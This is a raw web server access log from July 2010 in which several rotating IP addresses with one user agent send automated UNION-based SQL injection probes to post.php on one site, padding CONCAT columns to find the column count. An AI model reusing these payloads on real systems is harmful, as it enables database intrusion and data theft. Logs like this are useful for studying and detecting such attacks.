189.87.134.161 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1&type=html&topic_id=2229%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1487 "-" "czxt2s"
188.85.209.228 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2230&topic_index=0&sid=6054188153116c4d76e611cdcf5c137d%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1846 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1320 "-" "czxt2s"
190.245.146.167 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2229&topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 2776 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1096 "-" "czxt2s"
87.196.203.250 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?sid=27b62f0a0f567cda53bbf0e7a3a4c325&type=html&topic_id=1007&topic_index=42%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 13472 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 9655 "-" "czxt2s"
83.248.41.128 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2278&topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 6671 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12919 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1376 "-" "czxt2s"
190.245.146.167 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2229&topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 2776 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:16 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1375 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1151 "-" "czxt2s"
188.85.209.228 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2230&topic_index=0&sid=6054188153116c4d76e611cdcf5c137d%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1846 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 9768 "-" "czxt2s"
189.87.134.161 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1&type=html&topic_id=2229%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1543 "-" "czxt2s"
83.248.41.128 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2278&topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 6671 "-" "czxt2s"
87.196.203.250 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?sid=27b62f0a0f567cda53bbf0e7a3a4c325&type=html&topic_id=1007&topic_index=42%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 13528 "-" "czxt2s"
190.245.146.167 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2229&topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 2776 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1431 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12920 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1432 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1207 "-" "czxt2s"
188.85.209.228 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2230&topic_index=0&sid=6054188153116c4d76e611cdcf5c137d%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1846 "-" "czxt2s"
83.248.41.128 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2278&topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 6671 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 9880 "-" "czxt2s"
189.87.134.161 - - [05/Jul/2010:01:44:17 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1&type=html&topic_id=2229%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1599 "-" "czxt2s"
190.245.146.167 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2229&topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 2776 "-" "czxt2s"
87.196.203.250 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?sid=27b62f0a0f567cda53bbf0e7a3a4c325&type=html&topic_id=1007&topic_index=42%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 13584 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1488 "-" "czxt2s"
188.85.209.228 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2230&topic_index=0&sid=6054188153116c4d76e611cdcf5c137d%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1846 "-" "czxt2s"
88.7.172.75 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=6054188153116c4d76e611cdcf5c137d&type=html&topic_id=2230%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1487 "-" "czxt2s"
88.230.103.27 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6&type=html&topic_id=2278%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1263 "-" "czxt2s"
189.87.134.161 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?topic_index=0&sid=1ba4ef6ccf8b4634665d5a84d1b26bb1&type=html&topic_id=2229%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1655 "-" "czxt2s"
83.248.41.128 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=2278&topic_index=0&sid=49f0033704bc1bc6e12ed0e0798159c6%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 6671 "-" "czxt2s"
122.29.130.41 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656&topic_index=12%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 9992 "-" "czxt2s"
41.249.43.238 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?type=html&topic_id=1007&topic_index=42&sid=27b62f0a0f567cda53bbf0e7a3a4c325%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 12920 "-" "czxt2s"
87.196.203.250 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?sid=27b62f0a0f567cda53bbf0e7a3a4c325&type=html&topic_id=1007&topic_index=42%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 13640 "-" "czxt2s"
186.48.2.32 - - [05/Jul/2010:01:44:18 -0700] "GET wap.blackstardojo.org/post.php?topic_index=12&sid=bec13ba784d3861fbcf18db9c3851e76&type=html&topic_id=656%20and%201=2%20union%20select%20CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c),CONCAT(0x27,0x7c,0x5f,0x7c)%20/* HTTP/1.1" 200 1544 "-" "czxt2s"
